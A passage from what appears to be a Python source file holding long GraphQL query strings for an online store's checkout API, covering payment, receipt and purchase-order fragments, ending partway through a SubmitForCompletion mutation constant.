walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}... on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}... on AmazonPayClassicWalletConfig{__typename name orderingIndex}... on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{... on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}... on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}... on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}... on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{... on DepositPercentage{percentage __typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}poNumber merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{... on FilledBuyerIdentityTerms{customer{... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}... on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{... on SMSMarketingConsent{value __typename}... on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{... on FilledDutyTerms{totalDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tax{... on FilledTaxTerms{totalTaxAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{... on TargetAllLines{__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tip{tipSuggestions{... on TipSuggestion{__typename percentage amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{... on FilledTipTerms{tipLines{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{... on LocalizationExtension{fields{... on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{... on Captcha{provider challenge sitekey token __typename}... on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{... on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{... on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename... on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{... on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}... on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}... on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}... on PaypalWalletContent{paypalBillingAddress:billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}... on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}... on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}... on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on OffsitePaymentMethod{paymentMethodIdentifier name __typename}... on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}... on ManualPaymentMethod{id name paymentMethodIdentifier __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}... on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}... on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{... on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{... on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}... on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}... on WaitingReceipt{id pollDelay __typename}... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}... on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}... on FailedReceipt{id processingError{... on InventoryClaimFailure{__typename}... on InventoryReservationFailure{__typename}... on OrderCreationFailure{paymentsHaveBeenReverted __typename}... on OrderCreationSchedulingFailure{__typename}... on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}... on DiscountUsageLimitExceededFailure{__typename}... on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{... on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{... on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{... on PurchaseOrderPaymentTerms{billingAddress{__typename... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}... on PaypalWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}... on ApplePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}data signature version __typename}... on GooglePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on PaypalBillingAgreementPaymentMethod{token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{... on PurchaseOrderBuyerIdentityTerms{contactMethod{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}... on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename... on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){... on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}... on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}... on SubmitFailed{reason __typename}... on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{... on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml... on RemoveTermViolation{message{code localizedDescription __typename}target __typename}... on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}... on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}... on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}... on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}... on ApplyChangeViolation{message{code localizedDescription __typename}target from{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}to{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}__typename}... on InputValidationError{field __typename}... on PendingTermViolation{__typename}__typename}__typename}__typename}... on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}... on CheckpointDenied{redirectUrl __typename}... on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{... on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{... on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}... on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}... on WaitingReceipt{id pollDelay __typename}... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}... on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}... on FailedReceipt{id processingError{... on InventoryClaimFailure{__typename}... on InventoryReservationFailure{__typename}... on OrderCreationFailure{paymentsHaveBeenReverted __typename}... on OrderCreationSchedulingFailure{__typename}... on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}... on DiscountUsageLimitExceededFailure{__typename}... on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken 